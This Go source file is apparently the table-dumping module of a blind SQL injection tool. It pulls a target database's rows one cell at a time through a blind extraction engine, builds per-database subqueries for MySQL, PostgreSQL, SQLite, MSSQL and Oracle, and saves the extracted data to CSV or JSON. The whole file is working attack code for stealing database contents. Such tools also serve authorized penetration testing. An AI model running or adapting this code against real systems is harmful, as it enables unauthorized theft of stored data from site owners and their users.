package enumeration

import (
	"context"
	"encoding/csv"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
)

// DumpOptions configures a table dump.
type DumpOptions struct {
	Database    string
	Table       string
	Columns     []string // empty = all columns
	Where       string   // optional WHERE filter predicate text
	Limit       int64    // 0 = dump all rows
	Offset      int64    // starting row (0-based)
	Concurrency int      // parallel char extraction (blind only)
	Format      string   // "csv" (default) or "json"
	Output      string   // optional directory; when set, writes a file per table
}

// DumpResult holds a materialised dump.
type DumpResult struct {
	Rows [][]string
	Cols []string
}

// Dump extracts table content and returns it in memory. For very large tables
// prefer DumpStream. Formats the result if opts.Format or opts.Output is set.
func (e *Enumerator) Dump(ctx context.Context, opts DumpOptions) (*DumpResult, error) {
	if opts.Concurrency > 0 {
		e.opts.Concurrency = opts.Concurrency
		e.ext = NewExtractor(e.detector, e.client, e.opts)
	}
	cols, err := e.resolveColumns(ctx, opts)
	if err != nil {
		return nil, err
	}
	tableRef := opts.Table
	if opts.Database != "" {
		tableRef = opts.Database + "." + opts.Table
	}
	_ = tableRef

	count, err := e.CountRows(ctx, opts.Database, opts.Table)
	if err != nil {
		count = -1 // unknown, stream until empty
	}

	limit := opts.Limit
	offset := opts.Offset
	if offset < 0 {
		offset = 0
	}
	if limit <= 0 && count >= 0 {
		limit = count - offset
		if limit < 0 {
			limit = 0
		}
	}

	rows := make([][]string, 0, limit)
	start := offset
	for {
		if ctx.Err() != nil {
			return &DumpResult{Rows: rows, Cols: cols}, ctx.Err()
		}
		chunk, err := e.dumpChunk(ctx, opts.Database, opts.Table, cols, opts.Where, start, chunkSize(limit, count))
		if err != nil {
			return &DumpResult{Rows: rows, Cols: cols}, err
		}
		if len(chunk) == 0 {
			break
		}
		rows = append(rows, chunk...)
		start += int64(len(chunk))
		if limit > 0 && int64(len(rows)) >= limit {
			rows = rows[:limit]
			break
		}
	}

	res := &DumpResult{Rows: rows, Cols: cols}
	if opts.Output != "" {
		if werr := e.writeOutputFile(res, opts); werr != nil {
			return res, werr
		}
	}
	return res, nil
}

// DumpStream streams rows one at a time. Use this for very large tables.
func (e *Enumerator) DumpStream(ctx context.Context, opts DumpOptions) (<-chan []string, <-chan error) {
	rowsCh := make(chan []string)
	errCh := make(chan error, 1)
	go func() {
		defer close(rowsCh)
		defer close(errCh)
		cols, err := e.resolveColumns(ctx, opts)
		if err != nil {
			errCh <- err
			return
		}
		count, cerr := e.CountRows(ctx, opts.Database, opts.Table)
		if cerr != nil {
			count = -1
		}
		limit := opts.Limit
		offset := opts.Offset
		if offset < 0 {
			offset = 0
		}
		if limit <= 0 && count >= 0 {
			limit = count - offset
			if limit < 0 {
				limit = 0
			}
		}
		start := offset
		dumped := int64(0)
		for {
			if ctx.Err() != nil {
				errCh <- ctx.Err()
				return
			}
			chunk, err := e.dumpChunk(ctx, opts.Database, opts.Table, cols, opts.Where, start, chunkSize(limit, count))
			if err != nil {
				errCh <- err
				return
			}
			if len(chunk) == 0 {
				return
			}
			for _, r := range chunk {
				select {
				case rowsCh <- r:
				case <-ctx.Done():
					errCh <- ctx.Err()
					return
				}
				dumped++
				if limit > 0 && dumped >= limit {
					return
				}
			}
			start += int64(len(chunk))
		}
	}()
	return rowsCh, errCh
}

// resolveColumns determines the column list: explicit columns or all columns
// of the table.
func (e *Enumerator) resolveColumns(ctx context.Context, opts DumpOptions) ([]string, error) {
	if len(opts.Columns) > 0 {
		return opts.Columns, nil
	}
	cols, err := e.ListColumns(ctx, opts.Database, opts.Table)
	if err != nil {
		return nil, err
	}
	if len(cols) == 0 {
		return nil, fmt.Errorf("no columns resolved for %s.%s", opts.Database, opts.Table)
	}
	out := make([]string, 0, len(cols))
	for _, c := range cols {
		out = append(out, c.Name)
	}
	return out, nil
}

// chunkSize returns how many rows to attempt per extraction pass, bounded by
// the remaining limit, or the remaining count when known.
func chunkSize(limit, count int64) int64 {
	const capChunk = 100
	if limit > 0 && limit < capChunk {
		return limit
	}
	if count > 0 && count < capChunk {
		return count
	}
	return capChunk
}

// dumpChunk extracts up to n rows starting at offset, cell by cell, in
// parallel across columns using the blind engine.
func (e *Enumerator) dumpChunk(ctx context.Context, database, table string, cols []string, where string, offset, n int64) ([][]string, error) {
	if n <= 0 {
		return nil, nil
	}
	rows := make([][]string, n)
	for i := int64(0); i < n; i++ {
		rows[i] = make([]string, len(cols))
	}
	var wg sync.WaitGroup
	errCh := make(chan error, 1)
	var errOnce sync.Once
	sem := make(chan struct{}, e.opts.Concurrency)
	for j := range cols {
		col := cols[j]
		for i := int64(0); i < n; i++ {
			sem <- struct{}{}
			wg.Add(1)
			go func(j int, i int64, col string) {
				defer wg.Done()
				defer func() { <-sem }()
				val, err := e.extractCell(ctx, database, table, col, where, offset+i)
				if err != nil {
					errOnce.Do(func() { errCh <- fmt.Errorf("cell %q row %d: %w", col, offset+i, err) })
					return
				}
				rows[i][j] = val
				e.progressf("\r[dump] row %d/%d col %d/%d", offset+i+1, offset+n, j+1, len(cols))
			}(j, i, col)
		}
	}
	wg.Wait()
	select {
	case err := <-errCh:
		return nil, err
	default:
	}
	return rows, nil
}

// extractCell pulls one cell from (table[.db], rowOffset, col) as a scalar
// expression understood by the blind engine.
func (e *Enumerator) extractCell(ctx context.Context, database, table, col, where string, rowOffset int64) (string, error) {
	scalar := e.cellScalar(database, table, col, where, rowOffset)
	return e.ext.ExtractString(ctx, scalar)
}

// cellScalar builds an SQL expression yielding the scalar value of a single
// cell, using per-DBMS row offsets so pagination works even without a primary
// key.
func (e *Enumerator) cellScalar(database, table, col, where string, rowOffset int64) string {
	q := e.queries
	if q == nil {
		return "(SELECT " + col + " FROM " + table + " OFFSET " + itoa(rowOffset) + ")"
	}
	quoteIdent := q.QuoteIdent
	if quoteIdent == nil {
		quoteIdent = func(s string) string { return s }
	}
	tableRef := quoteIdent(table)
	if database != "" {
		tableRef = quoteIdent(database) + "." + tableRef
	}
	colRef := quoteIdent(col)
	w := ""
	if strings.TrimSpace(where) != "" {
		w = " WHERE " + where
	}
	switch e.ext.DB() {
	case "mysql", "postgres", "sqlite":
		return "(SELECT " + colRef + " FROM " + tableRef + w + " ORDER BY 1 LIMIT 1 OFFSET " + itoa(rowOffset) + ")"
	case "mssql":
		rn := rowOffset + 1
		return "(SELECT t." + colRef + " FROM (SELECT " + colRef + ", ROW_NUMBER() OVER (ORDER BY (SELECT 1)) AS __rn FROM " + tableRef + w + ") t WHERE t.__rn = " + itoa(rn) + ")"
	case "oracle":
		rn := rowOffset + 1
		return "(SELECT col FROM (SELECT " + colRef + " AS col, ROWNUM rn FROM " + tableRef + w + ") WHERE rn = " + itoa(rn) + ")"
	default:
		return "(SELECT " + colRef + " FROM " + tableRef + w + " LIMIT 1 OFFSET " + itoa(rowOffset) + ")"
	}
}

// writeOutputFile writes the dump to a per-table file in the output directory,
// selecting CSV or JSON from opts.Format.
func (e *Enumerator) writeOutputFile(res *DumpResult, opts DumpOptions) error {
	if err := os.MkdirAll(opts.Output, 0o755); err != nil {
		return err
	}
	name := sanitizeName(opts.Table) + "_" + sanitizeName(opts.Database)
	format := strings.ToLower(opts.Format)
	if format == "" {
		format = "csv"
	}
	path := filepath.Join(opts.Output, name+"."+format)
	f, err := os.Create(path)
	if err != nil {
		return err
	}
	defer f.Close()
	switch format {
	case "json":
		enc := json.NewEncoder(f)
		enc.SetIndent("", "  ")
		return enc.Encode(map[string]any{"columns": res.Cols, "rows": res.Rows})
	default:
		w := csv.NewWriter(f)
		if err := w.Write(res.Cols); err != nil {
			return err
		}
		for _, r := range res.Rows {
			if err := w.Write(r); err != nil {
				return err
			}
		}
		w.Flush()
		return w.Error()
	}
}

// sanitizeName builds a filesystem-safe name fragment from an identifier.
func sanitizeName(s string) string {
	if s == "" {
		return "table"
	}
	var sb strings.Builder
	for _, r := range s {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') || r == '_' || r == '-' {
			sb.WriteRune(r)
		} else {
			sb.WriteRune('_')
		}
	}
	return sb.String()
}
